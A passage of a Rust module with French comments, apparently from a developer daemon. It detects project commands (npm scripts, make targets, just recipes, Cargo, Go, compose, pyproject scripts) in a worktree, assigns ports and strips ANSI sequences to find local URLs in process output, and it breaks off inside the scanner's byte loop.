//! Runners (v0.3, lot 14a) : détection des commandes d'un worktree, repérage
//! des URL locales dans leur sortie, choix du port. Règles pures : les
//! fichiers sont lus par l'appelant (à travers [`RepoView`]), jamais
//! exécutés, et aucune commande ne vient d'ailleurs que d'ici (architecture
//! § 15 : « le démon n'exécute que des commandes construites par lui »).
//!
//! Sources reconnues, à la racine du worktree et dans ses sous-dossiers
//! directs (monodépôts : `app/package.json`…) :
//!
//! - `package.json` : un runner par script (`<gestionnaire> run <nom>`), le
//!   gestionnaire déduit du fichier de verrou (dossier, puis racine) ;
//! - `GNUmakefile` / `makefile` / `Makefile` (celui que `make` prendrait) :
//!   cibles explicites de ce fichier, sans suivre les inclusions ;
//! - `justfile` (et variantes) : recettes publiques sans paramètre requis ;
//! - `Cargo.toml` : `cargo run` / `test` / `build`, `cargo run -p` des
//!   membres du workspace qui ont un binaire ;
//! - `go.mod` : `go run .` (paquet `main` présent), `go test ./...`,
//!   `go build ./...` ;
//! - `compose.yaml` et variantes : `docker compose up` ;
//! - `pyproject.toml` : scripts déclarés, lancés par l'outil que désigne le
//!   fichier de verrou (`uv`, `poetry`, `pdm`).
//!
//! Un nom qui pourrait passer pour une option (`-…`), contient un caractère
//! de contrôle ou une syntaxe de l'outil (`$`, `%`, `=`…) est écarté : le
//! nom devient un argument de la commande, jamais une option.

use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::path::Path;

/// Fichier lu au plus (au-delà : source ignorée).
pub const MAX_SOURCE_BYTES: u64 = 1024 * 1024;
/// Sous-dossiers directs examinés au plus.
pub const MAX_SUBDIRS: usize = 64;
/// Runners détectés au plus.
pub const MAX_RUNNERS: usize = 200;
/// Membres d'un workspace Cargo examinés au plus.
pub const MAX_CARGO_MEMBERS: usize = 64;
/// Runners vivants au plus par session.
pub const MAX_LIVE_PER_SESSION: usize = 8;
/// Plage des ports attribués aux worktrees (`PORT`).
pub const PORT_MIN: u16 = 41_000;
pub const PORT_MAX: u16 = 41_999;
/// URL gardées au plus par processus.
pub const MAX_URLS: usize = 16;
/// Longueur maximale d'un nom de script, de cible ou de recette.
const MAX_NAME_LEN: usize = 200;
/// Ligne de sortie examinée au plus (au-delà, coupée).
const MAX_LINE: usize = 4096;
/// Séquence d'échappement (CSI, OSC, DCS…) lue au plus : au-delà, ou sur
/// CAN / SUB, elle est abandonnée et le texte reprend (une chaîne jamais
/// terminée n'absorbe pas la suite de la sortie).
const MAX_SEQUENCE: usize = 4096;

/// Sous-dossiers jamais examinés (dépendances, sorties de compilation).
const SKIPPED_DIRS: &[&str] = &[
    "node_modules",
    "target",
    "vendor",
    "dist",
    "build",
    "out",
    "venv",
    "__pycache__",
];

/// Type de runner (onglet « Lancer » : regroupement).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RunnerKind {
    Dev,
    Test,
    Build,
    Lint,
    Other,
}

impl RunnerKind {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Dev => "dev",
            Self::Test => "test",
            Self::Build => "build",
            Self::Lint => "lint",
            Self::Other => "other",
        }
    }
}

/// Une commande détectée.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Runner {
    /// Identifiant stable : la source (`app/package.json:dev`).
    pub id: String,
    pub label: String,
    pub kind: RunnerKind,
    /// Commande (argv) : programme puis arguments, jamais passée à un shell.
    pub command: Vec<String>,
    /// Dossier de lancement, relatif à la racine du worktree (`""` : racine).
    pub cwd: String,
    /// `fichier:clé`.
    pub source: String,
    /// Ce qui va réellement s'exécuter, tel que lu dans la source : corps du
    /// script (`package.json`, `pyproject.toml`), règle et recette
    /// (Makefile, justfile), fichier compose ; pour Cargo et Go, la commande.
    /// Entier ici ; coupé à [`MAX_BODY_SHOWN`] pour l'affichage.
    pub body: String,
    /// Fichier de verrou qui a choisi l'outil (`pnpm-lock.yaml`…), s'il y en a un.
    pub lock: Option<String>,
}

/// Corps montré au plus (octets) ; l'empreinte porte sur le corps entier.
pub const MAX_BODY_SHOWN: usize = 4096;

impl Runner {
    /// Empreinte de ce qui sera lancé : SHA-256 (hexadécimal) de
    /// `[command, cwd, source, body, lock]` en JSON. Un corps de script
    /// modifié, un autre verrou ou une autre commande la changent.
    pub fn fingerprint(&self) -> String {
        let v = serde_json::json!([self.command, self.cwd, self.source, self.body, self.lock]);
        super::files::sha256_hex(v.to_string().as_bytes())
    }

    /// Corps à montrer (coupé à [`MAX_BODY_SHOWN`] octets, sur une limite de
    /// caractère) et s'il a été coupé.
    pub fn shown_body(&self) -> (&str, bool) {
        if self.body.len() <= MAX_BODY_SHOWN {
            return (&self.body, false);
        }
        let mut end = MAX_BODY_SHOWN;
        while !self.body.is_char_boundary(end) {
            end -= 1;
        }
        (&self.body[..end], true)
    }

    fn with_body(mut self, body: impl Into<String>) -> Self {
        self.body = body.into();
        self
    }

    fn with_lock(mut self, lock: Option<String>) -> Self {
        self.lock = lock;
        self
    }
}

/// Lecture du worktree, confinée à sa racine (implémentée par le démon avec
/// les mêmes garanties que `files.read`). Chemins relatifs à la racine,
/// séparés par `/`, `""` pour la racine.
pub trait RepoView {
    /// Contenu d'un fichier ordinaire (texte UTF-8, [`MAX_SOURCE_BYTES`] au
    /// plus), `None` s'il est absent, trop gros ou illisible.
    fn read(&self, rel: &str) -> Option<String>;
    /// Le fichier existe (fichier ordinaire, sans suivre de lien sortant).
    fn is_file(&self, rel: &str) -> bool;
    /// Le dossier existe.
    fn is_dir(&self, rel: &str) -> bool;
    /// Sous-dossiers d'un dossier (noms), triés.
    fn subdirs(&self, rel: &str) -> Vec<String>;
    /// Fichiers ordinaires d'un dossier (noms), triés.
    fn files(&self, rel: &str) -> Vec<String>;
}

fn join(dir: &str, name: &str) -> String {
    if dir.is_empty() {
        name.to_owned()
    } else {
        format!("{dir}/{name}")
    }
}

/// Nom utilisable comme argument : non vide, pas une option, sans caractère
/// de contrôle ni blanc, raisonnablement court.
pub fn safe_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= MAX_NAME_LEN
        && !name.starts_with('-')
        && !name.chars().any(|c| c.is_control() || c.is_whitespace())
}

/// Type d'après le nom (`test:unit` → test, `dev-server` → dev…).
pub fn classify(name: &str) -> RunnerKind {
    let lower = name.to_lowercase();
    let base = lower
        .split([':', '-', '_', '.', '/', ' '])
        .find(|s| !s.is_empty())
        .unwrap_or("");
    let pick = |s: &str| -> Option<RunnerKind> {
        Some(match s {
            "dev" | "develop" | "start" | "serve" | "server" | "watch" | "preview" | "up"
            | "run" | "storybook" => RunnerKind::Dev,
            "test" | "tests" | "e2e" | "spec" | "specs" | "coverage" | "cov" | "jest"
            | "vitest" | "pytest" | "playwright" | "cypress" => RunnerKind::Test,
            "build" | "compile" | "bundle" | "dist" | "package" | "release" => RunnerKind::Build,
            "lint" | "fmt" | "format" | "check" | "typecheck" | "tsc" | "clippy" | "eslint"
            | "prettier" | "stylelint" | "vet" | "ruff" | "mypy" => RunnerKind::Lint,
            _ => return None,
        })
    };
    pick(base)
        .or_else(|| pick(&lower))
        .unwrap_or(RunnerKind::Other)
}

/// Détecte les runners du worktree.
pub fn detect(view: &dyn RepoView) -> Vec<Runner> {
    let mut out = Vec::new();
    let root_cargo = detect_cargo(view, "", &mut out);
    let mut dirs: Vec<String> = view
        .subdirs("")
        .into_iter()
        .filter(|d| !d.starts_with('.') && !SKIPPED_DIRS.contains(&d.as_str()))
        .take(MAX_SUBDIRS)
        .collect();
    dirs.insert(0, String::new());
    for dir in &dirs {
        if !dir.is_empty() && !root_cargo.contains(dir) {
            detect_cargo(view, dir, &mut out);
        }
        detect_package_json(view, dir, &mut out);
        detect_make(view, dir, &mut out);
        detect_just(view, dir, &mut out);
        detect_go(view, dir, &mut out);
        detect_compose(view, dir, &mut out);
        detect_pyproject(view, dir, &mut out);
        if out.len() >= MAX_RUNNERS {
            break;
        }
    }
    // Un identifiant n'apparaît qu'une fois (le premier gagne).
    let mut seen = HashSet::new();
    out.retain(|r| seen.insert(r.id.clone()));
    out.truncate(MAX_RUNNERS);
    out
}

fn runner(
    dir: &str,
    file: &str,
    key: &str,
    label: impl Into<String>,
    kind: RunnerKind,
    command: Vec<&str>,
) -> Runner {
    let source = format!("{}:{key}", join(dir, file));
    let command: Vec<String> = command.into_iter().map(str::to_owned).collect();
    Runner {
        id: source.clone(),
        label: label.into(),
        kind,
        body: command.join(" "),
        command,
        cwd: dir.to_owned(),
        source,
        lock: None,
    }
}

// ----------------------------------------------------------------- npm & co

/// Scripts du cycle de vie de npm, lancés par `install`/`publish`… : pas des
/// commandes à proposer.
const NPM_LIFECYCLE: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
    "publish",
    "postpublish",
    "prepack",
    "postpack",
    "preversion",
    "version",
    "postversion",
    "dependencies",
];

/// Gestionnaire de paquets d'après les fichiers de verrou (dossier, puis
/// racine), puis le champ `packageManager` ; `npm` par défaut. Renvoie aussi
/// le verrou qui a décidé.
fn package_manager(
    view: &dyn RepoView,
    dir: &str,
    field: Option<&str>,
) -> (&'static str, Option<String>) {
    let locks: &[(&str, &'static str)] = &[
        ("pnpm-lock.yaml", "pnpm"),
        ("yarn.lock", "yarn"),
        ("bun.lockb", "bun"),
        ("bun.lock", "bun"),
        ("package-lock.json", "npm"),
        ("npm-shrinkwrap.json", "npm"),
    ];
    let mut dirs = vec![dir];
    if !dir.is_empty() {
        dirs.push("");
    }
    for d in dirs {
        for (file, pm) in locks {
            let lock = join(d, file);
            if view.is_file(&lock) {
                return (pm, Some(lock));
            }
        }
    }
    let pm = match field.and_then(|f| f.split('@').next()) {
        Some("pnpm") => "pnpm",
        Some("yarn") => "yarn",
        Some("bun") => "bun",
        _ => "npm",
    };
    (pm, None)
}

fn detect_package_json(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    let Some(text) = view.read(&join(dir, "package.json")) else {
        return;
    };
    let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };
    let (pm, lock) = package_manager(
        view,
        dir,
        v.get("packageManager").and_then(serde_json::Value::as_str),
    );
    for (name, body) in scripts {
        let Some(body) = body.as_str() else {
            continue;
        };
        if !safe_name(name) || NPM_LIFECYCLE.contains(&name.as_str()) {
            continue;
        }
        // `predev` / `postdev` : crochets de `dev`, lancés avec lui.
        let hook = ["pre", "post"].iter().any(|p| {
            name.strip_prefix(p)
                .is_some_and(|base| !base.is_empty() && scripts.contains_key(base))
        });
        if hook {
            continue;
        }
        out.push(
            runner(
                dir,
                "package.json",
                name,
                name.clone(),
                classify(name),
                vec![pm, "run", name],
            )
            .with_body(body)
            .with_lock(lock.clone()),
        );
    }
}

// --------------------------------------------------------------------- make

/// Cibles explicites d'un Makefile : ni cibles spéciales (`.PHONY`…), ni
/// motifs (`%`), ni variables (`$`), ni fichiers (`/`, ou `.` sans être
/// déclarée `.PHONY`). Les inclusions ne sont pas suivies, les recettes et
/// les blocs `define` sont sautés.
pub fn make_targets(text: &str) -> Vec<String> {
    make_rules(text).into_iter().map(|(n, _)| n).collect()
}

/// Cibles de [`make_targets`] avec leur corps : chaque ligne de règle qui
/// les définit, suivie de ses lignes de recette.
pub fn make_rules(text: &str) -> Vec<(String, String)> {
    let mut lines: Vec<String> = Vec::new();
    let mut cur = String::new();
    for raw in text.lines() {
        if let Some(stripped) = raw.strip_suffix('\\') {
            cur.push_str(stripped);
            cur.push(' ');
            continue;
        }
        cur.push_str(raw);
        lines.push(std::mem::take(&mut cur));
    }
    if !cur.is_empty() {
        lines.push(cur);
    }
    let mut targets: Vec<(String, Vec<String>)> = Vec::new();
    let mut phony: HashSet<String> = HashSet::new();
    let mut in_define = 0usize;
    // Cibles de la dernière règle (reçoivent les lignes de recette).
    let mut current: Vec<usize> = Vec::new();
    for full in &lines {
        if full.starts_with('\t') {
            if in_define == 0 {
                for &i in &current {
                    targets[i].1.push(full.clone());
                }
            }
            continue; // recette
        }
        let line = match full.find('#') {
            Some(i) => &full[..i],
            None => full.as_str(),
        };
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue; // ligne vide ou commentaire : la recette continue
        }
        current.clear();
        let first = trimmed.split_whitespace().next().unwrap_or("");
        let after_directive = |kw: &str| first == kw;
        if after_directive("define")
            || ["override", "export"]
                .iter()
                .any(|k| first == *k && trimmed.split_whitespace().nth(1) == Some("define"))
        {
            in_define += 1;
            continue;
        }
        if after_directive("endef") {
            in_define = in_define.saturating_sub(1);
            continue;
        }
        if in_define > 0 || trimmed.is_empty() {
            continue;
        }
        if [
            "include", "-include", "sinclude", "export", "unexport", "override", "vpath", "ifeq",
            "ifneq", "ifdef", "ifndef", "else", "endif", "undefine", "private", "load",
        ]
        .contains(&first)
        {
            continue;
        }
        // Premier `:` qui n'introduit pas une affectation.
        let Some(colon) = trimmed.find(':') else {
            continue;
        };
        if trimmed[..colon].contains('=') {
            continue; // affectation (`A = b:c`)
        }
        let mut rest = &trimmed[colon + 1..];
        if rest.starts_with(':') {
            rest = &rest[1..];
            if rest.starts_with(':') {
                rest = &rest[1..];
            }
        }
        if rest.starts_with('=') {
            continue; // `:=`, `::=`, `:::=`
        }
        let recipe_cut = rest.find(';').map_or(rest, |i| &rest[..i]);
        let names_part = trimmed[..colon].trim().trim_end_matches('&').trim();
        if names_part == ".PHONY" {
            phony.extend(recipe_cut.split_whitespace().map(str::to_owned));
            continue;
        }
        if recipe_cut.contains('=') {
            continue; // variable propre à une cible (`t: X = 1`)
        }
        for name in names_part.split_whitespace() {
            let ok = safe_name(name)
                && !name.starts_with('.')
                && !name.contains(['$', '%', '(', ')', '=', '\\', '/', '"', '\'', '*', '?']);
            if !ok {
                continue;
            }
            let i = match targets.iter().position(|(t, _)| t == name) {
                Some(i) => i,
                None => {
                    targets.push((name.to_owned(), Vec::new()));
                    targets.len() - 1
                }
            };
            targets[i].1.push(full.trim_end().to_owned());
            current.push(i);
        }
    }
    targets.retain(|(t, _)| !t.contains('.') || phony.contains(t));
    targets
        .into_iter()
        .map(|(t, body)| (t, body.join("\n")))
        .collect()
}

fn detect_make(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    // L'ordre de recherche de GNU make : seul le premier compte.
    let Some((file, text)) = ["GNUmakefile", "makefile", "Makefile"]
        .iter()
        .find_map(|f| view.read(&join(dir, f)).map(|t| (*f, t)))
    else {
        return;
    };
    for (t, body) in make_rules(&text) {
        out.push(runner(dir, file, &t, t.clone(), classify(&t), vec!["make", &t]).with_body(body));
    }
}

// --------------------------------------------------------------------- just

/// Recettes d'un justfile lançables sans argument : publiques (ni `_…` ni
/// `[private]`), sans paramètre requis (un paramètre avec valeur par défaut
/// ou `*variadique` est accepté).
pub fn just_recipes(text: &str) -> Vec<String> {
    just_rules(text).into_iter().map(|(n, _)| n).collect()
}

/// Recettes de [`just_recipes`] avec leur corps : l'en-tête et ses lignes
/// indentées.
pub fn just_rules(text: &str) -> Vec<(String, String)> {
    let all: Vec<&str> = text.lines().collect();
    let mut out: Vec<(String, String)> = Vec::new();
    let mut private_next = false;
    for (idx, line) in all.iter().enumerate() {
        let line = *line;
        if line.starts_with([' ', '\t']) || line.trim().is_empty() {
            continue; // corps de recette
        }
        let t = line.trim_end();
        if t.starts_with('#') {
            continue;
        }
        if let Some(attrs) = t.strip_prefix('[') {
            if attrs.split([',', ']']).any(|a| a.trim() == "private") {
                private_next = true;
            }
            continue;
        }
        let private = std::mem::take(&mut private_next);
        let first = t.split_whitespace().next().unwrap_or("");
        if ["set", "alias", "export", "import", "mod", "unexport"].contains(&first)
            && t.len() > first.len()
        {
            continue;
        }
        let body = t.strip_prefix('@').unwrap_or(t);
        let name_len = body
            .char_indices()
            .find(|(i, c)| !(c.is_ascii_alphanumeric() || *c == '_' || (*c == '-' && *i > 0)))
            .map_or(body.len(), |(i, _)| i);
        let name = &body[..name_len];
        if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
            continue;
        }
        let rest = &body[name_len..];
        if rest.trim_start().starts_with(":=") {
            continue; // affectation
        }
        let Some(params) = just_params(rest) else {
            continue;
        };
        if private || name.starts_with('_') || !safe_name(name) {
            continue;
        }
        if params.iter().any(|p| p.required) {
            continue;
        }
        if !out.iter().any(|(n, _)| n == name) {
            let mut body = vec![t];
            for next in &all[idx + 1..] {
                if !(next.starts_with([' ', '\t']) || next.trim().is_empty()) {
                    break;
                }
                body.push(next.trim_end());
            }
            while body.last().is_some_and(|l| l.is_empty()) {
                body.pop();
            }
            out.push((name.to_owned(), body.join("\n")));
        }
    }
    out
}

struct JustParam {
    required: bool,
}

/// Paramètres d'un en-tête de recette (texte après le nom, jusqu'au `:`),
/// `None` si ce n'est pas un en-tête de recette.
fn just_params(rest: &str) -> Option<Vec<JustParam>> {
    let mut params = Vec::new();
    let chars: Vec<char> = rest.chars().collect();
    let mut i = 0;
    loop {
        while i < chars.len() && chars[i].is_whitespace() {
            i += 1;
        }
        if i >= chars.len() {
            return None; // pas de `:`
        }
        if chars[i] == ':' {
            if chars.get(i + 1) == Some(&'=') {
                return None;
            }
            return Some(params);
        }
        // Un paramètre : [+*][$]nom[=défaut].
        // `*` : zéro ou plus (facultatif) ; `+` : un ou plus (requis).
        let mut variadic_star = false;
        if chars[i] == '*' {
            variadic_star = true;
            i += 1;
        } else if chars[i] == '+' {
            i += 1;
        }
        if chars.get(i) == Some(&'$') {
            i += 1;
        }
        let start = i;
        while i < chars.len()
            && (chars[i].is_ascii_alphanumeric() || chars[i] == '_' || chars[i] == '-')
        {
            i += 1;
        }
        if i == start {
            return None;
        }
        let mut has_default = false;
        if chars.get(i) == Some(&'=') {
            has_default = true;
            i += 1;
            i = skip_just_value(&chars, i)?;
        }
        params.push(JustParam {
            required: !has_default && !variadic_star,
        });
    }
}

/// Saute une valeur par défaut : chaîne entre guillemets, backticks,
/// expression entre parenthèses ou mot.
fn skip_just_value(chars: &[char], mut i: usize) -> Option<usize> {
    match chars.get(i)? {
        q @ ('\'' | '"' | '`') => {
            let q = *q;
            i += 1;
            while i < chars.len() && chars[i] != q {
                if chars[i] == '\\' && q == '"' {
                    i += 1;
                }
                i += 1;
            }
            (i < chars.len()).then_some(i + 1)
        }
        '(' => {
            let mut depth = 0usize;
            let mut quote: Option<char> = None;
            while i < chars.len() {
                let c = chars[i];
                match quote {
                    Some(q) if c == q => quote = None,
                    Some(_) => {}
                    None => match c {
                        '\'' | '"' | '`' => quote = Some(c),
                        '(' => depth += 1,
                        ')' => {
                            depth -= 1;
                            if depth == 0 {
                                return Some(i + 1);
                            }
                        }
                        _ => {}
                    },
                }
                i += 1;
            }
            None
        }
        _ => {
            while i < chars.len() && !chars[i].is_whitespace() && chars[i] != ':' {
                i += 1;
            }
            Some(i)
        }
    }
}

fn detect_just(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    let Some((file, text)) = ["justfile", "Justfile", ".justfile", "JUSTFILE"]
        .iter()
        .find_map(|f| view.read(&join(dir, f)).map(|t| (*f, t)))
    else {
        return;
    };
    for (r, body) in just_rules(&text) {
        out.push(runner(dir, file, &r, r.clone(), classify(&r), vec!["just", &r]).with_body(body));
    }
}

// -------------------------------------------------------------------- cargo

/// Nom de paquet Cargo acceptable pour `-p`.
fn cargo_name_ok(name: &str) -> bool {
    safe_name(name)
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Le paquet du dossier a-t-il un binaire ?
fn cargo_has_bin(view: &dyn RepoView, dir: &str, table: &toml::Table) -> bool {
    table
        .get("bin")
        .and_then(|b| b.as_array())
        .is_some_and(|a| !a.is_empty())
        || view.is_file(&join(dir, "src/main.rs"))
        || view.is_dir(&join(dir, "src/bin"))
}

/// Membres d'un workspace : chemins littéraux et motifs `dossier/*`.
fn cargo_members(view: &dyn RepoView, dir: &str, ws: &toml::Table) -> Vec<String> {
    let list = |key: &str| -> Vec<String> {
        ws.get(key)
            .and_then(|m| m.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(str::to_owned))
                    .collect()
            })
            .unwrap_or_default()
    };
    let exclude: HashSet<String> = list("exclude")
        .into_iter()
        .map(|e| e.trim_end_matches('/').to_owned())
        .collect();
    let mut out = Vec::new();
    for m in list("members") {
        let m = m.trim_end_matches('/');
        if m.is_empty() || m.starts_with('/') || m.split('/').any(|c| c == "..") {
            continue;
        }
        if let Some(parent) = m.strip_suffix("/*") {
            if parent.contains(['*', '?', '[']) {
                continue;
            }
            for sub in view.subdirs(&join(dir, parent)) {
                out.push(format!("{parent}/{sub}"));
            }
        } else if !m.contains(['*', '?', '[']) {
            out.push(m.to_owned());
        }
    }
    out.retain(|m| !exclude.contains(m));
    out.dedup();
    out.truncate(MAX_CARGO_MEMBERS);
    out
}

/// Runners Cargo d'un dossier ; renvoie les sous-dossiers directs de la
/// racine qui sont membres de son workspace (déjà couverts par `-p`).
fn detect_cargo(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) -> HashSet<String> {
    let mut covered = HashSet::new();
    let Some(text) = view.read(&join(dir, "Cargo.toml")) else {
        return covered;
    };
    let Ok(table) = text.parse::<toml::Table>() else {
        return covered;
    };
    let file = "Cargo.toml";
    let package = table.get("package").and_then(|p| p.as_table());
    let workspace = table.get("workspace").and_then(|w| w.as_table());
    if package.is_some() && cargo_has_bin(view, dir, &table) {
        out.push(runner(
            dir,
            file,
            "run",
            "cargo run",
            RunnerKind::Dev,
            vec!["cargo", "run"],
        ));
    }
    if let Some(ws) = workspace {
        out.push(runner(
            dir,
            file,
            "test",
            "cargo test --workspace",
            RunnerKind::Test,
            vec!["cargo", "test", "--workspace"],
        ));
        out.push(runner(
            dir,
            file,
            "build",
            "cargo build --workspace",
            RunnerKind::Build,
            vec!["cargo", "build", "--workspace"],
        ));
        let root_name = package.and_then(|p| p.get("name")).and_then(|n| n.as_str());
        for m in cargo_members(view, dir, ws) {
            if dir.is_empty()
                && let Some(top) = m.split('/').next()
                && !m.contains('/')
            {
                covered.insert(top.to_owned());
            }
            let mdir = join(dir, &m);
            let Some(mt) = view
                .read(&join(&mdir, "Cargo.toml"))
                .and_then(|t| t.parse::<toml::Table>().ok())
            else {
                continue;
            };
            let Some(name) = mt
                .get("package")
                .and_then(|p| p.get("name"))
                .and_then(|n| n.as_str())
            else {
                continue;
            };
            if !cargo_name_ok(name) || Some(name) == root_name || !cargo_has_bin(view, &mdir, &mt) {
                continue;
            }
            out.push(runner(
                dir,
                file,
                &format!("run:{name}"),
                format!("cargo run -p {name}"),
                RunnerKind::Dev,
                vec!["cargo", "run", "-p", name],
            ));
        }
    } else if package.is_some() {
        out.push(runner(
            dir,
            file,
            "test",
            "cargo test",
            RunnerKind::Test,
            vec!["cargo", "test"],
        ));
        out.push(runner(
            dir,
            file,
            "build",
            "cargo build",
            RunnerKind::Build,
            vec!["cargo", "build"],
        ));
    }
    covered
}

// ----------------------------------------------------------------------- go

/// Un fichier Go (hors tests) du dossier déclare-t-il `package main` ?
fn go_has_main(view: &dyn RepoView, dir: &str) -> bool {
    view.files(dir)
        .iter()
        .filter(|f| f.ends_with(".go") && !f.ends_with("_test.go"))
        .take(32)
        .any(|f| {
            view.read(&join(dir, f)).is_some_and(|t| {
                t.lines()
                    .map(str::trim)
                    .find(|l| l.starts_with("package "))
                    .is_some_and(|l| l.split_whitespace().nth(1) == Some("main"))
            })
        })
}

fn detect_go(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    if !view.is_file(&join(dir, "go.mod")) {
        return;
    }
    let file = "go.mod";
    if go_has_main(view, dir) {
        out.push(runner(
            dir,
            file,
            "run",
            "go run .",
            RunnerKind::Dev,
            vec!["go", "run", "."],
        ));
    }
    out.push(runner(
        dir,
        file,
        "test",
        "go test ./...",
        RunnerKind::Test,
        vec!["go", "test", "./..."],
    ));
    out.push(runner(
        dir,
        file,
        "build",
        "go build ./...",
        RunnerKind::Build,
        vec!["go", "build", "./..."],
    ));
}

// ------------------------------------------------------------------ compose

fn detect_compose(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    // Ordre de préférence de `docker compose`.
    let Some(file) = [
        "compose.yaml",
        "compose.yml",
        "docker-compose.yaml",
        "docker-compose.yml",
    ]
    .into_iter()
    .find(|f| view.is_file(&join(dir, f))) else {
        return;
    };
    // Le corps : le fichier compose lui-même (services, images, commandes).
    let body = view.read(&join(dir, file)).unwrap_or_default();
    out.push(
        runner(
            dir,
            file,
            "up",
            "docker compose up",
            RunnerKind::Dev,
            vec!["docker", "compose", "-f", file, "up"],
        )
        .with_body(body),
    );
}

// ---------------------------------------------------------------- pyproject

fn detect_pyproject(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    let Some(table) = view
        .read(&join(dir, "pyproject.toml"))
        .and_then(|t| t.parse::<toml::Table>().ok())
    else {
        return;
    };
    let tool = table.get("tool").and_then(|t| t.as_table());
    // Verrou du dossier, sinon de la racine.
    let lock_of = |f: &str| -> Option<String> {
        let here = join(dir, f);
        if view.is_file(&here) {
            Some(here)
        } else if view.is_file(f) {
            Some(f.to_owned())
        } else {
            None
        }
    };
    // L'outil vient du fichier de verrou (sinon de sa section) : jamais
    // deviné, un `uv run` sans verrou en écrirait un dans le dépôt.
    let has = |k: &str| tool.is_some_and(|t| t.contains_key(k));
    let (runner_tool, lock) = if let Some(l) = lock_of("uv.lock") {
        (Some("uv"), Some(l))
    } else if let Some(l) = lock_of("poetry.lock") {
        (Some("poetry"), Some(l))
    } else if has("poetry") {
        (Some("poetry"), None)
    } else if let Some(l) = lock_of("pdm.lock") {
        (Some("pdm"), Some(l))
    } else if has("pdm") {
        (Some("pdm"), None)
    } else {
        (None, None)
    };
    // Clés d'une table de scripts, avec leur corps (texte, sinon la valeur TOML).
    let entries = |v: Option<&toml::Value>| -> Vec<(String, String)> {
        v.and_then(|s| s.as_table())
            .map(|t| {
                t.iter()
                    .map(|(k, v)| {
                        let body = v.as_str().map_or_else(
                            || serde_json::to_string(v).unwrap_or_default(),
                            str::to_owned,
                        );
                        (k.clone(), body)
                    })
                    .collect()
            })
            .unwrap_or_default()
    };
    let mut names: BTreeMap<String, (&'static str, String, Option<String>)> = BTreeMap::new();
    if let Some(tool_name) = runner_tool {
        let project = table.get("project");
        for (k, b) in entries(project.and_then(|p| p.get("scripts"))) {
            names.insert(k, (tool_name, b, lock.clone()));
        }
        if tool_name == "poetry" {
            for (k, b) in entries(
                tool.and_then(|t| t.get("poetry"))
                    .and_then(|p| p.get("scripts")),
            ) {
                names.insert(k, ("poetry", b, lock.clone()));
            }
        }
    }
    // Scripts de pdm (tâches) : toujours lancés par pdm.
    let pdm_lock = lock_of("pdm.lock");
    for (k, b) in entries(
        tool.and_then(|t| t.get("pdm"))
            .and_then(|p| p.get("scripts")),
    ) {
        if k != "_" {
            names.entry(k).or_insert(("pdm", b, pdm_lock.clone()));
        }
    }
    for (name, (tool_name, body, lock)) in names {
        if !safe_name(&name) {
            continue;
        }
        out.push(
            runner(
                dir,
                "pyproject.toml",
                &name,
                name.clone(),
                classify(&name),
                vec![tool_name, "run", &name],
            )
            .with_body(body)
            .with_lock(lock),
        );
    }
}

// --------------------------------------------------------------------- port

/// Port préféré d'un worktree, stable (dérivé de son chemin) : le même à
/// chaque démarrage du démon tant qu'il est libre.
pub fn preferred_port(root: &Path) -> u16 {
    let span = u64::from(PORT_MAX - PORT_MIN) + 1;
    let h = super::worktree::fnv1a64(root.as_os_str().as_encoded_bytes());
    PORT_MIN + (h % span) as u16
}

/// Premier port de la plage, à partir de `preferred` (en bouclant), ni
/// réservé (autre worktree) ni pris.
pub fn pick_port(
    preferred: u16,
    reserved: &HashSet<u16>,
    mut taken: impl FnMut(u16) -> bool,
) -> Option<u16> {
    let span = PORT_MAX - PORT_MIN + 1;
    let start = preferred.clamp(PORT_MIN, PORT_MAX) - PORT_MIN;
    (0..span)
        .map(|i| PORT_MIN + (start + i) % span)
        .find(|p| !reserved.contains(p) && !taken(*p))
}

// ---------------------------------------------------------------------- URL

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum AnsiState {
    #[default]
    Text,
    /// Après ESC.
    Esc,
    /// Séquence CSI (`ESC [`), jusqu'à l'octet final.
    Csi,
    /// Chaîne (OSC, DCS, APC, PM, SOS) jusqu'à BEL ou `ESC \`.
    Str,
    /// ESC dans une chaîne.
    StrEsc,
}

/// Repère les URL locales dans la sortie d'un runner, par lignes, après
/// retrait des séquences ANSI (même coupées entre deux lectures).
#[derive(Debug, Default)]
pub struct UrlScanner {
    state: AnsiState,
    /// Octets lus dans la séquence en cours (CSI ou chaîne).
    seq_len: usize,
    line: Vec<u8>,
    seen: BTreeSet<String>,
    order: Vec<String>,
}

impl UrlScanner {
    pub fn new() -> Self {
        Self::default()
    }

    /// URL trouvées jusqu'ici, dans l'ordre d'apparition.
    pub fn urls(&self) -> &[String] {
        &self.order
    }

    /// Octets sortis du PTY ; renvoie `true` si une URL nouvelle est apparue.
    pub fn feed(&mut self, data: &[u8]) -> bool {
        let mut changed = false;
        for &b in data {
            if matches!(
                self.state,
                AnsiState::Csi | AnsiState::Str | AnsiState::StrEsc
            ) {
                self.seq_len += 1;
                if b == 0x18 || b == 0x1a || self.seq_len > MAX_SEQUENCE {
                    self.state = AnsiState::Text;
                    continue;
                }
            }
            match self.state {
                AnsiState::Text => match b {
                    0x1b => {
                        self.state = AnsiState::Esc;
                        self.seq_len = 0;
                    }
                    b'\n' | b'\r' => changed |= self.end_line(),
                    0x00..=0x1f | 0x7f => {}
                    _ => {
                        self.line.push(b);
                        if self.line.len() >= MAX_LINE {
